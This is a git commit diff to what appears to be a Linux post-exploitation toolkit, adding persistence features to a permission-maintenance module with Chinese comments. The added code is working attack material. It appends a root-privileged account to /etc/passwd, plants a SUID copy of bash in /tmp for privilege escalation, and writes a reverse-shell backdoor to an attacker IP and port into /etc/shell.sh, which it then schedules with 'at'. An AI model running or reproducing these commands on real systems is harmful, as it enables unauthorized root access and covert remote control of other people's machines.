6a3af680f3e554859bd6a1226dcd8a9b105f5013
ShadowMusk <103261784+ShadowMusk@users.noreply.github.com>
2024-01-05 18:04:32 +0800

    Destroy Linux（Linux系统渗透模块）:updated PermissionMaintenance_main_linux.py

--- DestroyLinux/PermissionMaintenance_linux/PermissionMaintenance_main_linux.py
+++ DestroyLinux/PermissionMaintenance_linux/PermissionMaintenance_main_linux.py
@@ -52,6 +52,39 @@ class PermissionMaintenance:
                     command = "usermod -aG sudo {}".format(choice.split()[1])
                     self.receive(conn, command)
                     continue
+                elif choice.split()[0] == '5':
+                    print('\033[1;32;32m' + "[+] 生成密文密码：" + '\033[0m')
+                    command = "perl -le 'print crypt(\"{}\",\"{}\")'".format(choice.split()[2], choice.split()[3])
+                    print("加密后的密码:")
+                    self.receive(conn, command)
+                    passwd_salt = input("输入加密后的密码 > ")
+                    command = "echo \"{}:{}:{}:/root:/bin/bash\" >> /etc/passwd".format(choice.split()[1], passwd_salt, choice.split()[4])
+                    self.receive(conn, command)
+                    print('\033[1;32;32m' + "[+] 查看/etc/passwd文件中的{}用户：".format(choice.split()[1]) + '\033[0m')
+                    command = "cat /etc/passwd | grep {}".format(choice.split()[1])
+                    self.receive(conn, command)
+                elif choice == '6':
+                    print('\033[1;32;32m' + "[+] 复制bash文件到/tmp目录下，并重命名为shell：" + '\033[0m')
+                    command = "cp /bin/bash /tmp/shell"
+                    self.receive(conn, command)
+                    print('\033[1;32;32m' + "[+] 设置/tmp目录下的shell文件的SetUID权限：" + '\033[0m')
+                    command = "chmod u+s /tmp/shell"
+                    self.receive(conn, command)
+                    print("如果上述两个操作均正常执行，那么普通用户便可通过执行\"/tmp/shell -p\"命令来把身份切换到root.")
+                elif choice.split()[0] == '7':
+                    print('\033[1;32;32m' + "[+] 创建反弹后门shell.sh，其中攻击者IP为{}，监听的端口号为{}：".format(choice.split()[6], choice.split()[7]) + '\033[0m')
+                    command = "echo '#!/bin/bash' > /shell.sh"
+                    self.receive(conn, command)
+                    command2 = "echo 'bash -i >& /dev/tcp/{}/{} 0>&1' >> /etc/shell.sh".format(choice.split()[6], choice.split()[7])
+                    self.receive(conn, command2)
+                    command3 = "chmod +sx /etc/shell.sh"
+                    self.receive(conn, command3)
+                    print("[+] 创建的反弹shell后门文件/etc/shell.sh如下：")
+                    command4 = "cat /etc/shell.sh"
+                    self.receive(conn, command4)
+                    print('\033[1;32;32m' + "[+] 创建定时任务，该计划定时任务为在{}/{}/{} {}:{}执行反弹shell文件/etc/shell.sh：".format(choice.split()[5], choice.split()[4], choice.split()[3], choice.split()[2], choice.split()[1]) + '\033[0m')
+                    command5 = "echo '/etc/shell.sh' | at {}:{} {}/{}/{}".format(choice.split()[2], choice.split()[1], choice.split()[4], choice.split()[3], choice.split()[5])
+                    self.receive(conn, command5)
             except:
                 print('\033[1;31;31m' + "[-] something wrong!" + '\033[0m')
                 continue
@@ -77,7 +110,10 @@ class PermissionMaintenance:
         mydata = [["1", "Forgery Time", "1 reference target", "伪造目标文件的创建时间"],
                   ["2", "Lock File", "2 Lock_File", "锁定目标文件，使其无法被删除"],
                   ["3", "Hide target file", "3 hide_file", "隐藏目标文件"],
-                  ["4", "Create a user with sudo permissions", "4 username password", "创建具有sudo权限的用户"]]
+                  ["4", "Create a user with sudo permissions", "4 username password", "创建具有sudo权限的用户"],
+                  ["5", "Add root user to the/etc/passwd file", "5 username password salt usergroup", "往/etc/passwd文件添加root用户"],
+                  ["6", "suid shell", "6", "使普通用户变为root"],
+                  ["7", "Scheduled Tasks", "7 min hour day month year attacker_ip port", "创建反弹shell的计划定时任务，让该反弹shell文件在规定时间执行"]]
         MyTable.createTable(headers, mydata)
 
     def show_params(self):
@@ -88,5 +124,14 @@ class PermissionMaintenance:
                   ["Lock_File", "需要锁定的目标文件，要求输入绝对路径，如/root/Desktop/3.txt"],
                   ["hide_file", "需要隐藏的目标文件，要求输入绝对路径，如/root/Desktop/4.txt"],
                   ["username", "用户名"],
-                  ["password", "用户密码"]]
+                  ["password", "用户密码"],
+                  ["salt", "盐值"],
+                  ["usergroup", "用户组"],
+                  ["min", "分钟"],
+                  ["hour", "小时"],
+                  ["day", "日"],
+                  ["month", "月"],
+                  ["year", "年"],
+                  ["attacker_ip", "攻击者IP"],
+                  ["port", "监听端口"]]
         MyTable.createTable(headers, mydata)
